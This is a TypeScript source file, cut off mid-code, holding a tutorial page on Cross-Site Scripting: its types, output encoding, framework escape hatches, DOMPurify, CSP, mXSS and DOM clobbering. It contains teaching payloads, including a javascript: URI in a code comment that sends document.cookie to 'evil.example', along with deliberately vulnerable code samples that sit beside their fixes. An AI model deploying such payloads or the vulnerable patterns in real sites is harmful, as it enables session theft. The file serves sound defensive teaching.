import type { SkillContent } from "../types";

/**
 * XSS (Cross-Site Scripting) — full 50-section knowledge page.
 * Code blocks use ~~~ fences (CommonMark-equivalent to backtick fences)
 * so this file needs no backtick escaping inside the template literals.
 */
const xss: SkillContent = {
  overview: `
Cross-Site Scripting (XSS) is a class of injection vulnerability where an attacker gets a browser to execute JavaScript (or otherwise interpret attacker-controlled markup) inside the security context of a trusted website. Unlike server-side injection attacks that compromise a database or an operating system, XSS compromises the browser tab itself — the attacker's script runs with the same origin, cookies, local storage, and DOM access as the legitimate site's own code. That is what makes it dangerous: the browser has no way to tell "the site's script" apart from "a script the site accidentally echoed back."

For an AI engineer this is not a niche concern. Any product that renders user-generated content, model output, or third-party data into a web page is a candidate: chat UIs that render markdown or HTML from an LLM response, RAG applications that display retrieved document snippets, admin dashboards that show usernames or support tickets, and agent frameworks that let a model write files a browser later renders. LLM output is attacker-influenceable text by definition (prompt injection can steer what a model emits), so "render model output directly into the DOM" is a modern, very real XSS vector that classic security training rarely covers.

Key characteristics: XSS is fundamentally a **context confusion** bug — data that should stay data gets parsed as code because it was placed into an HTML, JavaScript, URL, or CSS context without the encoding that context requires. It has three classic delivery mechanisms (stored, reflected, DOM-based, covered in Beginner Concepts), it is exploitable entirely within the victim's browser (no server compromise needed), and its primary and only durable fix is **contextual output encoding**, with sanitization, Content Security Policy, and HttpOnly cookies acting as defense-in-depth layers around that core fix.

XSS has held a Top 3 spot in the OWASP Top 10 for essentially its entire history and since 2021 lives inside the broader **A03:2021 – Injection** category — see the **OWASP Top 10** skill for how it fits alongside SQL Injection and command injection as siblings that all share the same root cause: untrusted data crossing into a context where it is interpreted as instructions.
`,

  history: `
The term "Cross-Site Scripting" was coined around 2000 by security engineers at Microsoft while documenting attacks that used one site to inject script that ran "across" to another site's origin — the "cross-site" name stuck even though today's most common variants (stored, DOM-based) do not always involve two sites at all. The acronym is XSS rather than CSS specifically to avoid collision with Cascading Style Sheets.

| Year | Milestone |
|------|-----------|
| Mid-1990s | Early dynamic web apps (CGI scripts) start reflecting user input into HTML responses; the first injection bugs appear informally |
| 2000 | Microsoft security advisories formalize the term "Cross-Site Scripting" |
| 2003 | OWASP founded; XSS becomes a named category in early web-security guidance |
| 2005 | The Samy worm hits MySpace — a stored XSS payload self-propagates to over one million profiles in about 20 hours, the most famous XSS case study ever produced |
| 2007 | OWASP Top 10 (2007 edition) lists XSS as its own numbered risk category |
| 2010 | The "Mikeyy" worm exploits stored XSS on Twitter via profile fields |
| 2012 | W3C Content Security Policy (CSP) Level 1 becomes a Candidate Recommendation — the first standardized script allowlisting mechanism for browsers |
| 2014–2015 | CSP Level 2 adds nonce-based and hash-based source allowlisting, solving CSP's original "inline script" blind spot |
| 2013–2015 | Mario Heiderich and collaborators publish foundational mutation-XSS (mXSS) research, showing that sanitized-looking strings can still become executable after the browser re-parses them |
| 2016–2018 | React, Angular, and Vue reach mainstream adoption; auto-escaping template output becomes the industry default rather than an opt-in |
| 2018 | CSP Level 3 adds strict-dynamic, letting a trusted initial script propagate trust to scripts it loads, which fixes CSP's poor interaction with bundlers and CDNs |
| 2021 | OWASP Top 10 2021 folds XSS into the broader **A03:2021 – Injection** category alongside SQL/command injection, reflecting a shared root cause |
| 2022–2025 | The Trusted Types API (Chromium-led) ships to let applications enforce "no raw string may reach a dangerous DOM sink" at the browser level, closing the DOM-based XSS gap that CSP alone could not |

The pattern across this timeline: browsers first shipped a powerful, general-purpose scripting capability with almost no way to constrain it; every subsequent decade added a narrower opt-in control (CSP, then nonces, then Trusted Types) so applications could progressively lock down what their own pages were allowed to do.
`,

  "why-it-exists": `
XSS exists because of a gap between two design assumptions that were both individually reasonable and jointly dangerous:

1. **Browsers trust script per-origin, unconditionally.** The Same-Origin Policy says "script from origin A can fully manipulate the DOM, cookies, and storage of pages served from origin A." This is a sound trust boundary — until origin A's own server or client-side code accidentally lets an attacker's text be treated as if it were origin A's own script.
2. **Dynamic web applications are built by mixing trusted code with untrusted data in the same document.** A comment box, a search box, a username field, a URL query parameter — all of these are attacker-reachable strings that end up rendered inside HTML that the browser was told to trust completely.

Before templating engines and modern frameworks existed, developers built HTML by string concatenation: reading a request parameter and splicing it directly into an HTML response. There was no language-level distinction between "this substring is data" and "this substring is markup" — the browser's parser is the only thing that decides, and it decides based on characters like less-than and quote marks, not on programmer intent. The world before XSS-aware development was one where every string interpolation into HTML was implicitly a security decision that almost nobody was making consciously.

XSS is the specific name for what happens when that gap is exploited: the browser's completely correct, per-origin trust model is handed a string that programmatically originated from an attacker but which the parser cannot distinguish from a string the site's own developers wrote.
`,

  "problem-it-solves": `
Framed correctly, XSS is not a technology that "solves" a problem — it is an attack class, and this section describes the concrete harm it causes and the boundary of what it does and does not achieve, which matters for scoping defenses correctly.

**What a successful XSS exploit gives an attacker**, once their script runs in a victim's browser on the target origin:

- **Session and credential theft.** Reading document.cookie (if cookies are not HttpOnly — see the **Cookies & Sessions** skill), reading tokens out of localStorage/sessionStorage, or simply making authenticated fetch calls using the victim's live session to exfiltrate data or take actions as the victim.
- **Full DOM control**: rewriting the page (defacement, fake login prompts, keyloggers on password fields), redirecting the user, or silently injecting a cryptomining or ad-fraud script.
- **Privilege abuse via impersonation**: any action the legitimate page could perform on the victim's behalf (post as them, change their email, transfer funds in a poorly designed banking UI) the script can now perform too, because it runs with the page's own privileges.
- **Self-propagation**: stored XSS in a social feature (comments, profile fields, direct messages) can write itself into other users' content, producing a worm — the Samy MySpace worm is the canonical example.
- **A pivot for further attacks**: XSS can be chained to defeat CSRF tokens (the script reads the token straight out of the DOM), bypass 2FA prompts by manipulating the page in real time, or exfiltrate API keys accidentally exposed to client-side code (see the **Secrets Management** skill).

**What XSS deliberately does NOT give an attacker**, which is important for correctly triaging severity:

- It does not, by itself, compromise the server, the database, or the underlying infrastructure — unlike SQL Injection (see the **SQL Injection** skill), the attacker's code runs in the victim's browser, not on the server.
- It does not defeat Transport Layer Security — TLS still protects the wire (see the **TLS & HTTPS** skill); XSS operates entirely after decryption, inside the rendered page.
- It cannot, on its own, read another origin's cookies or data; the Same-Origin Policy still confines the stolen script to the origin it was injected into (which is precisely why the injected origin is the one that matters).
- It is not fixed by "validating input harder" alone — a payload can be perfectly well-formed, legitimate-looking text (a name like Robert'); onload=alert(1)//) that only becomes dangerous because of where it is placed on output, which is the central lesson of the Intermediate Concepts section.
`,

  "learning-objectives": `
By the end of this page you should be able to:

1. Explain, precisely, why XSS is a context-confusion bug rather than a "bad input" bug, and defend that framing against "just sanitize the input" pushback.
2. Distinguish stored, reflected, and DOM-based XSS, and identify which one applies given a vulnerability report or a code snippet.
3. Apply the correct encoding for each of the four output contexts: HTML body, HTML attribute, JavaScript, and URL — and explain why using the wrong one still leaves a hole.
4. Read and write a Content Security Policy using nonce-based and hash-based script-src directives, and explain what CSP does and does not protect against.
5. Explain how React, Vue, and Django/Jinja2 auto-escape output by default, and identify every documented escape hatch (dangerouslySetInnerHTML, v-html, the safe filter/mark_safe) that reintroduces risk.
6. Use DOMPurify correctly to allow a safe subset of rich-text HTML when raw HTML genuinely must be rendered.
7. Explain why HttpOnly cookies mitigate — but do not prevent — the impact of a successful XSS exploit, and connect this to session design (see the **Cookies & Sessions** skill).
8. Describe mutation XSS (mXSS) and DOM clobbering at a level sufficient for a senior-engineer interview, including a concrete example of each.
9. Set up a CSP, a linter rule, and a code-review checklist that would have caught each of the vulnerable examples on this page before merge.
10. Position XSS correctly against CSRF, SQL Injection, and clickjacking — same trust model, different exploitation direction — for architecture and threat-modeling discussions.
`,

  prerequisites: `
- **Required**: working knowledge of HTML, CSS, and JavaScript; understanding of the HTTP request/response cycle; how cookies work and what a session is (see the **Cookies & Sessions** skill — read it first if that is unfamiliar, since HttpOnly, Secure, and SameSite all matter here).
- **Required**: a basic mental model of the browser Same-Origin Policy — "origin" meaning scheme + host + port, and why script from one origin cannot normally read another origin's DOM or cookies. This page builds directly on that model in Beginner Concepts.
- **Helpful**: familiarity with at least one server-side templating engine (Jinja2, EJS, Django templates) or one frontend framework (React or Vue) — the framework auto-escaping examples assume you have seen a template render a variable before.
- **Helpful, not required**: the **OWASP Top 10** skill for how XSS is categorized alongside other injection risks, and the **SQL Injection** skill for the parallel "never build code by concatenating untrusted strings" lesson in a different context.

Dependency links on this platform: **HTTP** → **Cookies & Sessions** → this page → **CSRF** (opposite exploitation direction, same trust model) → **OWASP Top 10** (the umbrella view) → **Secrets Management** (what an attacker does with what XSS exposes).
`,

  "beginner-concepts": `
### The core mechanic: script execution in a trusted origin

XSS happens when attacker-controlled text ends up somewhere the browser will parse as executable script or as markup that can trigger script execution (an event handler attribute, a javascript colon URI, an inline style with an expression, and so on). The simplest possible payload is a literal script tag:

~~~html
<script>alert(document.cookie)</script>
~~~

If a page renders that string without encoding it, the browser does not see "a comment containing the text script tag" — it sees an actual script element and executes it, with full access to that page's cookies, DOM, and any authenticated session.

### Type 1 — Stored (persistent) XSS

The payload is saved on the server (in a database, a file, a cache) and served back to every visitor who views the affected page. This is the most severe variant because it needs no social engineering — the victim just has to browse to a normal page.

Vulnerable (Node/Express + a naive comment renderer):

~~~javascript
// VULNERABLE: comment body is stored as-is and re-inserted with innerHTML
app.post("/comments", (req, res) => {
  db.comments.insert({ body: req.body.text });   // stored verbatim, no encoding
  res.redirect("/post");
});

// client-side render
function renderComment(comment) {
  const el = document.createElement("div");
  el.innerHTML = comment.body;      // DANGER: innerHTML parses HTML, including <script>
  feed.appendChild(el);
}
~~~

An attacker submits a comment containing an img tag with an onerror handler (script tags inserted via innerHTML do not execute in most browsers, but event-handler attributes like onerror absolutely do): a comment body of an img element with a broken src and onerror set to steal the cookie. Every subsequent visitor who loads that comment thread runs the attacker's script.

Fixed:

~~~javascript
// FIXED: render as text, never as HTML, unless the content is explicitly sanitized
function renderComment(comment) {
  const el = document.createElement("div");
  el.textContent = comment.body;    // textContent NEVER parses HTML — it is always literal text
  feed.appendChild(el);
}
~~~

textContent tells the browser "treat this string as data, always" — the parser never runs over it looking for tags. That single API choice (textContent vs innerHTML) is the difference between safe and vulnerable in most vanilla-JS rendering code.

### Type 2 — Reflected (non-persistent) XSS

The payload arrives in the request (typically a URL query parameter) and the server "reflects" it straight back into the response HTML without encoding. It requires the attacker to get the victim to click a crafted link — usually via phishing, a shortened URL, or a malicious ad — but it needs no stored state.

Vulnerable (Express + a naive search page):

~~~javascript
// VULNERABLE: query parameter spliced directly into the HTML response
app.get("/search", (req, res) => {
  const q = req.query.q;
  res.send("<h1>Results for: " + q + "</h1>");   // string concatenation into HTML
});
~~~

A crafted link of the form slash search question-mark q equals a script tag containing document.location assignment to an attacker's server plus document.cookie, sent to a victim, executes the moment the victim opens it — no click on the page required, just loading the link.

Fixed:

~~~javascript
const escapeHtml = require("escape-html");   // or your framework's built-in escaper

app.get("/search", (req, res) => {
  const q = escapeHtml(req.query.q);   // less-than becomes &lt; etc — text, not markup
  res.send("<h1>Results for: " + q + "</h1>");
});
~~~

Encoding the value converts the dangerous characters into their HTML-entity equivalents, so the browser renders the literal text of the attacker's payload instead of executing it.

### Type 3 — DOM-based XSS

The vulnerability lives entirely in client-side JavaScript: a "source" (attacker-influenceable data already present in the browser, such as location.hash, location.search, document.referrer, or window.name) flows into a "sink" (a dangerous DOM API such as innerHTML, document.write, or eval) without ever necessarily touching the server. This is the variant most often missed by server-side security reviews, because the server response can look perfectly clean — the bug is purely in the client script.

Vulnerable:

~~~javascript
// VULNERABLE: reads directly from the URL fragment and writes it as HTML
function showWelcomeBanner() {
  const name = location.hash.slice(1);          // source: attacker controls the URL fragment
  document.getElementById("banner").innerHTML =  // sink: innerHTML parses HTML
    "Welcome, " + decodeURIComponent(name) + "!";
}
~~~

A link ending in a hash fragment containing an img tag with a broken src and onerror set to run attacker script executes purely client-side; the fragment (after the hash) is never even sent to the server, so server logs show nothing unusual.

Fixed:

~~~javascript
function showWelcomeBanner() {
  const name = location.hash.slice(1);
  document.getElementById("banner").textContent =   // sink swapped to a safe API
    "Welcome, " + decodeURIComponent(name) + "!";
}
~~~

### Why the browser's Same-Origin Policy makes this dangerous in the first place

The Same-Origin Policy (SOP) is what makes XSS worth exploiting at all: script running on your bank's origin can read your bank's cookies and call your bank's authenticated APIs, but a malicious page at attacker.example cannot — SOP blocks it. XSS is valuable to an attacker precisely because it is a way to get their script to run **as if it were the trusted origin's own script**, borrowing every privilege SOP would otherwise deny them. Without SOP, there would be nothing meaningfully different about "my script" versus "an injected script" — SOP is the trust boundary XSS breaches from the inside.
`,

  "intermediate-concepts": `
### Contextual output encoding — the one true primary defense

The single most important idea on this page: **the correct defense against XSS is encoding untrusted data for the exact context it is being placed into, at the point of output**, not at the point of input. A string that is perfectly safe in one context can be dangerous in another, so a single "sanitize on the way in" step can never be sufficient — the same value might later be dropped into an HTML body, an HTML attribute, a script block, and a URL, each requiring different encoding.

### HTML body context — HTML entity encoding

When inserting untrusted text as HTML content (between tags), encode the characters that have special meaning to the HTML parser:

~~~text
&   ->  &amp;
<   ->  &lt;
>   ->  &gt;
"   ->  &quot;
'   ->  &#x27;
~~~

~~~javascript
const escapeHtml = (s) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
   .replace(/"/g, "&quot;").replace(/'/g, "&#x27;");

const safe = "<h1>Results for: " + escapeHtml(userInput) + "</h1>";
~~~

### HTML attribute context — attribute encoding, plus quote everything

Inside an attribute value, quote marks are what matter most — an unquoted attribute is exploitable via whitespace alone. The OWASP-recommended rule is to encode every character outside the alphanumeric range as an HTML entity when the value lands inside an attribute, and to always use double quotes around the attribute:

~~~html
<!-- VULNERABLE: unquoted attribute, breakable with a space -->
<input value=USERINPUT>

<!-- Still risky: quoted, but a literal quote mark in USERINPUT breaks out -->
<input value="USERINPUT">

<!-- FIXED: quoted AND every non-alphanumeric character HTML-entity encoded -->
<input value="&#x55;SERINPUT&#x2E;">
~~~

### JavaScript context — JS string escaping (never string interpolation into a script block)

Untrusted data should essentially never be hand-spliced into an inline script. If it must be, it needs JavaScript-string escaping (backslash-escaping quotes, backslashes, and encoding as unicode escapes) AND HTML encoding of the surrounding characters, because the value sits inside both an HTML script element and a JS string literal simultaneously:

~~~javascript
// VULNERABLE: server-rendered inline script with a raw value spliced in
// <script>var user = "USERINPUT";</script>
// if USERINPUT contains a quote and a semicolon, the attacker writes new JS statements

// SAFER: serialize with a real JSON encoder, and encode HTML-sensitive characters in the output
const dataForScript = JSON.stringify(userInput)
  .replace(/</g, "\\\\u003c")
  .replace(/>/g, "\\\\u003e")
  .replace(/&/g, "\\\\u0026");
// <script>var user = DATA_FOR_SCRIPT;</script>
~~~

The safest option by far is to avoid inline scripts entirely: pass server data to the client via a JSON API call or a data attribute read with getAttribute, and let JSON.parse (which never executes code, unlike eval) turn it back into a JS value.

### URL context — URL (percent) encoding, plus scheme validation

When untrusted data becomes part of a URL — a query string value, or worse, the whole href — percent-encode it, and separately validate that the scheme is an allowed one (http/https), because encoding alone does not stop a javascript colon URI from being dangerous if the whole URL is attacker-controlled:

~~~javascript
// VULNERABLE: user-controlled URL used directly as a link target
// <a href="USERINPUT">click</a>
// USERINPUT = "javascript:fetch('//evil.example/steal?c='+document.cookie)"
// clicking the link RUNS that JavaScript — no HTML injection needed at all

function safeHref(url) {
  try {
    const parsed = new URL(url, location.origin);
    if (!["http:", "https:"].includes(parsed.protocol)) return "#";
    return parsed.toString();
  } catch {
    return "#";
  }
}
~~~

### Why "just sanitize the input" is the wrong framing

"Sanitize input" usually means: scan incoming data once, strip or reject anything that looks like a script tag, and assume the data is now safe everywhere it is ever used. This framing fails for several concrete reasons:

1. **The same value is often used in multiple contexts.** A username might be rendered as HTML text on a profile page, as an attribute value in an avatar's alt text, and as a JSON field in an API response consumed by client JS. One encoding cannot satisfy all three; only encoding at each output site can.
2. **Blacklist filters are trivially bypassable.** Stripping the literal string script tag misses img with onerror, svg with onload, details with ontoggle, a javascript colon URI, and dozens of other execution vectors, plus encoding tricks (mixed case, null bytes, HTML entities) that reconstruct a blocked pattern after the filter runs.
3. **Legitimate data can look identical to an attack.** A name like OReilly with an apostrophe, or a security researcher's bio text discussing "script tags," should not be corrupted or rejected — but a naive input filter cannot distinguish intent from content.
4. **It moves the security decision away from the one place that has full context** — the render/output site is where you definitively know whether a string is about to become HTML, an attribute, JS, or a URL. Input time has none of that information yet.

The correct mental model: validate input for correctness (is this a plausible email address, is this number in range) as a data-quality control, and encode output for the destination context as the security control. They are different jobs and neither substitutes for the other.

### Framework auto-escaping — React JSX

React escapes any value interpolated into JSX text or attributes by default, rendering it as text via safe DOM APIs rather than innerHTML:

~~~jsx
function Comment({ body }) {
  return <p>{body}</p>;   // body is auto-escaped; a script tag renders as visible text, not code
}
~~~

The escape hatch is dangerouslySetInnerHTML, whose name is a deliberate warning label — it takes a plain object with a key literally named double-underscore html double-underscore, and it bypasses React's escaping entirely:

~~~jsx
function RichComment({ trustedHtml }) {
  // Only ever pass content that has ALREADY been through a sanitizer (see DOMPurify below).
  // Never pass raw user input here directly.
  return <div dangerouslySetInnerHTML={{ __html: trustedHtml }} />;
}
~~~

### Framework auto-escaping — Vue v-html

Vue's text interpolation and v-bind escape by default; v-html is the explicit, named escape hatch that inserts raw HTML and is documented by the Vue team as a common source of XSS if the bound value is not fully trusted:

~~~html
<!-- Safe by default: interpolation escapes -->
<p>{{ userComment }}</p>

<!-- Escape hatch: only for content you have sanitized yourself -->
<div v-html="sanitizedHtml"></div>
~~~

### Framework auto-escaping — Django templates and Jinja2

Both autoescape HTML by default when configured for HTML output (Django templates always do by default; Flask enables Jinja2 autoescaping automatically for .html templates). The escape hatch in Django is the safe filter or the mark_safe function; in Jinja2 it is the safe filter:

~~~text
{# Django template: auto-escaped by default #}
<p>{{ comment.body }}</p>

{# Explicit opt-out -- only ever apply to content that has been sanitized #}
<p>{{ comment.body|safe }}</p>
~~~

~~~python
# Django view code: mark_safe is the equivalent Python-side opt-out
from django.utils.safestring import mark_safe
from django.utils.html import escape

# WRONG: marking raw user input as safe skips escaping entirely
rendered = mark_safe(user_supplied_html)

# RIGHT: escape explicitly if you build a string outside the template layer
rendered = escape(user_supplied_html)
~~~

The pattern across all four frameworks is identical: escaping is the default, and every framework gives the raw-HTML escape hatch an unmistakable, single, greppable name (dangerouslySetInnerHTML, v-html, the safe filter, mark_safe) specifically so that code review and static analysis tools can flag every place raw HTML is allowed through.

### Sanitization libraries — DOMPurify for cases where raw HTML must be allowed

Sometimes an application genuinely needs to render rich, attacker-influenceable HTML — a markdown editor's preview, a rendered LLM response that legitimately contains formatting, an email client. This is exactly the case auto-escaping cannot solve (the whole point is to allow SOME markup), and it is exactly the case "sanitize on input" arguments miss: you still sanitize at the render boundary, using an allowlist-based library, not a handwritten blacklist.

~~~javascript
import DOMPurify from "dompurify";

// Allowlist approach: only named-safe tags/attributes survive; scripts, event handlers,
// javascript: URIs, and known mutation-XSS vectors are stripped by a well-audited library.
const clean = DOMPurify.sanitize(untrustedHtmlFromLlmOrUser, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "li", "code", "pre"],
  ALLOWED_ATTR: ["href"],
});

element.innerHTML = clean;   // now safe to use innerHTML — the sanitizer already ran
~~~

DOMPurify is worth using specifically because it defends against known mutation-XSS payloads (see Advanced Concepts) that a naive "strip script tags with a regex" implementation would miss — it operates on the parsed DOM tree, the same way the browser will, rather than on the raw string.
`,

  "advanced-concepts": `
### Content Security Policy (CSP) — defense-in-depth, not a primary fix

CSP is an HTTP response header that lets a page declare, declaratively, which sources of script (and other resources) the browser is allowed to execute or load. It is a compensating control: it does not stop the injection from happening, but it can stop the injected script from running or from exfiltrating data, even if an encoding bug slips through.

~~~text
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM123' 'strict-dynamic'; object-src 'none'; base-uri 'self'
~~~

- **script-src** is the directive that matters most for XSS: it restricts which script sources the browser will execute. A strict policy like the one above blocks inline script tags and event-handler attributes entirely unless they carry a matching nonce, which is exactly what stops most injected payloads from running even if the injection itself succeeded.
- **object-src none** blocks Flash/plugin-based script execution vectors, a legacy but still-recommended hardening line.
- **base-uri self** prevents an attacker from injecting a base tag that would silently redirect all relative URLs (including script sources) to an attacker-controlled origin.

### Nonce-based CSP

A nonce is a random, unguessable, single-use token generated fresh on the server **for every single response** and placed both in the CSP header and as a nonce attribute on each legitimate inline script tag. The browser only executes an inline script if its nonce attribute matches the one in the header for that response.

~~~text
Content-Security-Policy: script-src 'nonce-8f3e2a91'
~~~
~~~html
<script nonce="8f3e2a91">initApp();</script>
~~~

The nonce must be regenerated on every response and must be cryptographically random — reusing a nonce, or predicting it, defeats the entire mechanism, because an attacker who can guess or observe the nonce can simply attach it to their injected script too.

### Hash-based CSP

For static inline scripts whose content never changes, CSP allows listing the base64-encoded SHA-256 (or SHA-384/512) hash of the exact script content instead of a nonce — no per-request generation needed:

~~~text
Content-Security-Policy: script-src 'sha256-abc123examplehashvalue='
~~~

Hash-based CSP is a good fit for a small number of fixed inline bootstrap scripts; it becomes unwieldy for many dynamically generated inline scripts, where nonces are the better tool.

### strict-dynamic — solving CSP's bundler problem

Modern apps load most of their code via a handful of trusted entry-point scripts (a bundle loader) which then dynamically inject further script tags. Without strict-dynamic, every one of those dynamically created scripts would need its own nonce or hash, which is impractical. strict-dynamic says: "if a script with a valid nonce loaded you, you are trusted too" — trust propagates from the explicitly allowed script to whatever it loads, while ignoring host-based allowlists (which are otherwise easy to bypass via JSONP endpoints or open redirects on allowlisted domains).

### What CSP does not protect against

CSP is not a substitute for encoding: DOM-based XSS that manipulates existing, already-trusted DOM elements (rewriting text, changing a link's href, injecting content that does not require a new script element) can still succeed under a strict CSP, because CSP governs script *execution sources*, not general DOM manipulation. CSP also cannot help if the attacker can inject a script that matches an allowed nonce (for example, via a header-injection bug that lets them read or set the nonce) or if the policy itself is misconfigured with an overly broad script-src (such as allowing unsafe-inline, which defeats the entire mechanism).

### Mutation XSS (mXSS)

A payload can be perfectly sanitized as a **string** — no script tags, no event handlers, no javascript colon URIs present in the text a sanitizer inspected — and still become executable once the browser's HTML parser processes and re-serializes it. This happens because innerHTML round-trips through parse-then-serialize, and the HTML parser can "normalize" malformed or unusual markup into a different, dangerous structure than the string the sanitizer checked. The seminal example (Heiderich et al., 2013) showed that certain SVG- and MathML-namespace markup, when assigned via innerHTML and then read back, mutates into markup containing an executable event handler that was not present in the original string at all. The practical defense is to use a sanitizer, such as DOMPurify, that is specifically tested against known mXSS payloads and operates on the actual parsed DOM rather than the source string — hand-rolled regex-based sanitizers are essentially guaranteed to miss mutation vectors.

### DOM Clobbering

DOM Clobbering does not require any script execution at all — it abuses the browser's behavior of exposing certain named HTML elements as global JavaScript variables or as named properties on other DOM nodes. If application code contains something like "if (window.config) doSomethingWith(window.config)" and an attacker can inject arbitrary (script-free) HTML containing an element with id equal to config, the browser will "clobber" window.config with a reference to that element instead of the value the developer expected — silently hijacking application logic without ever running attacker JavaScript. This matters specifically because it defeats sanitizers whose only goal is "remove anything that can execute script" — clobbering payloads are, by design, script-free and pass exactly that kind of check. Defenses: never trust the mere *presence* of a global as proof it holds developer-authored data (check its actual type, e.g. verify it is a real object/function and not an HTMLElement), and prefer explicit namespacing (a single frozen configuration object assigned once, early, rather than implicit globals) so there is nothing left for an injected element to shadow.

### Same-Origin Policy internals, revisited

Origin is defined as the triple of scheme, host, and port — https colon slash slash example.com and http colon slash slash example.com are different origins despite the same host, because the scheme differs. SOP governs script-level access to another origin's DOM, cookies (subject to cookie domain scoping, which is looser than SOP), and most storage. Two important edge cases for senior interviews: postMessage lets two windows of different origins communicate deliberately, but only if the receiving handler validates event.origin — omitting that check reopens a cross-origin hole that XSS defenses do not cover; and document.domain relaxation (legacy, largely disabled by browsers now) historically let cooperating subdomains loosen SOP between themselves, which if misused, widened an XSS's blast radius across an entire subdomain family.
`,

  "internal-working": `
Understanding why XSS is possible requires understanding how a browser turns response bytes into a running page, and exactly where an injected string can jump from "data" to "instruction."

~~~mermaid
flowchart LR
    A["HTTP response bytes"] --> B["HTML tokenizer"]
    B --> C["Tree construction (DOM)"]
    C --> D["Script execution\n(parser-blocking or deferred)"]
    D --> E["Rendered page + live DOM\n(cookies, storage, fetch all accessible)"]
    B -.injection point 1:\nuntrusted text becomes a new tag/attribute.-> C
    D -.injection point 2:\nuntrusted string reaches innerHTML/eval at runtime.-> E
~~~

1. **Tokenizing**: the HTML parser reads the byte stream and classifies characters into tokens — start tags, end tags, attributes, text — based purely on characters like less-than, greater-than, and quote marks. It has no concept of "this text came from a database field" versus "this text was written by the developer." If an attacker's unescaped less-than-script-greater-than appears in the byte stream at a point where the tokenizer is in "data" state, it is tokenized as a real start tag, indistinguishable from one the developer wrote.
2. **Tree construction**: tokens become DOM nodes. A script element discovered during tree construction is queued for execution; an element with an event-handler attribute (onerror, onload, onmouseover) gets that attribute's value registered as a JavaScript event listener the moment the element is inserted.
3. **Script execution**: parser-inserted script elements execute in document order (subject to async/defer); scripts assigned via innerHTML specifically do NOT execute for a literal script tag (a well-known browser quirk — the tree-construction algorithm treats a script element created this way as inert), which is exactly why real-world stored-XSS payloads overwhelmingly use event-handler attributes on elements like img or svg instead of a script tag, since those DO fire once inserted.
4. **Live DOM = live privileges**: once any script executes in the page, it runs with full access to that document's cookies (unless HttpOnly — see the **Cookies & Sessions** skill), localStorage, sessionStorage, the entire DOM, and the ability to make same-origin fetch calls carrying the ambient session. There is no additional sandboxing between "script the developer wrote" and "script that got here via an injected string" — this is the fundamental reason there is no way to make injected script "less dangerous" after the fact; the only effective controls act *before* execution (encoding, CSP) or *limit the blast radius of a successful theft* (HttpOnly cookies).

The two injection points marked on the diagram map directly onto the three classic types: stored and reflected XSS typically hit injection point 1 (the initial parse of the HTTP response), while DOM-based XSS hits injection point 2 (a runtime call to a dangerous sink after the page has already loaded).
`,

  architecture: `
A mature application does not rely on any single control to stop XSS — it layers independent defenses so that a failure in one layer is caught by the next. Think of this as concentric rings, ordered from "closest to the actual bug" to "blast-radius limitation."

~~~mermaid
flowchart TB
    subgraph L1["Layer 1 — Framework defaults"]
        F1["Auto-escaping template/JSX rendering\n(React, Vue, Django, Jinja2)"]
    end
    subgraph L2["Layer 2 — Explicit contextual encoding"]
        F2["HTML / attribute / JS / URL encoders\napplied at every raw-HTML escape hatch"]
    end
    subgraph L3["Layer 3 — Sanitization for allowed rich content"]
        F3["DOMPurify / server-side allowlist sanitizer\nfor markdown, LLM output, rich text"]
    end
    subgraph L4["Layer 4 — Browser-enforced policy"]
        F4["CSP (nonce/hash script-src, object-src none)\nTrusted Types"]
    end
    subgraph L5["Layer 5 — Blast-radius limitation"]
        F5["HttpOnly + Secure + SameSite cookies\nshort-lived tokens, no secrets in localStorage"]
    end
    L1 --> L2 --> L3 --> L4 --> L5
~~~

Application layout that supports this in practice:

~~~text
webapp/
├── templates/               # Django/Jinja2 — autoescape ON globally, never per-template off
├── src/
│   ├── components/          # React/Vue components — grep-audited for dangerouslySetInnerHTML / v-html
│   ├── sanitize/            # single shared module wrapping DOMPurify with the app's allowlist
│   └── http/
│       └── securityHeaders.ts   # CSP, X-Content-Type-Options, Referrer-Policy set in one place
├── middleware/
│   └── csp.ts                # generates a fresh nonce per request, injects into templates + header
└── tests/
    └── security/              # snapshot tests asserting encoded output for known payload strings
~~~

The architectural rule that matters most: **raw-HTML escape hatches must be centralized and few.** If dangerouslySetInnerHTML, v-html, mark_safe, and any handwritten innerHTML assignment are scattered across a codebase, each one is an independent chance to forget sanitization. Routing every legitimate "I need to render some HTML" need through one shared, sanitizer-wrapped helper turns "audit the whole codebase" into "audit one file."
`,

  "data-flow": `
Tracing a reflected XSS attack end to end, from crafted link to stolen session:

~~~mermaid
sequenceDiagram
    participant Attacker
    participant Victim as Victim's browser
    participant Site as Vulnerable site (example.com)
    participant Evil as Attacker's server

    Attacker->>Attacker: craft URL: example.com/search?q=<script>...steal cookie...</script>
    Attacker->>Victim: deliver link (phishing email, malicious ad, shortened URL)
    Victim->>Site: GET /search?q=<script>...</script>
    Note over Site: server reads req.query.q and splices it, UNESCAPED, into the HTML response
    Site-->>Victim: 200 OK, HTML body contains the literal script tag
    Victim->>Victim: browser parses response, tokenizes <script> as a real element
    Victim->>Victim: script executes with example.com's origin privileges
    Victim->>Victim: script reads document.cookie (if not HttpOnly)
    Victim->>Evil: fetch/image beacon carrying the stolen cookie
    Evil-->>Attacker: attacker now has a valid session cookie for example.com
    Attacker->>Site: replay the stolen cookie, impersonate the victim
~~~

Two details worth internalizing from this trace: first, the vulnerable step is entirely server-side (splicing the query parameter unescaped) and the exploited step is entirely client-side (the browser's own trusted parser executing what it believes is the site's markup) — the fix belongs at the server-side output step, but the damage is realized in the browser. Second, every subsequent stage after "script executes" (reading cookies, exfiltrating them, replaying them) is just normal, legitimate browser and HTTP behavior — there is no further "hacking" happening; the entire attack succeeds or fails at the single unescaped-output line. This is why output encoding is described as the primary defense: get that one step right and the rest of the chain never starts.
`,

  "production-usage": `
### Encoding and templating

Real teams do not hand-roll HTML escaping. They pick a framework whose templating or rendering layer auto-escapes by default (React/JSX, Vue, Django templates, Jinja2 with autoescape on, Go's html/template which is context-aware by design) and treat any raw-HTML escape hatch as a reviewed, logged exception rather than routine code.

### Security headers as standard middleware

~~~javascript
// Express + helmet: CSP and related headers applied globally, not per-route
const helmet = require("helmet");
const crypto = require("crypto");

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");   // fresh nonce per request
  next();
});

app.use((req, res, next) => {
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
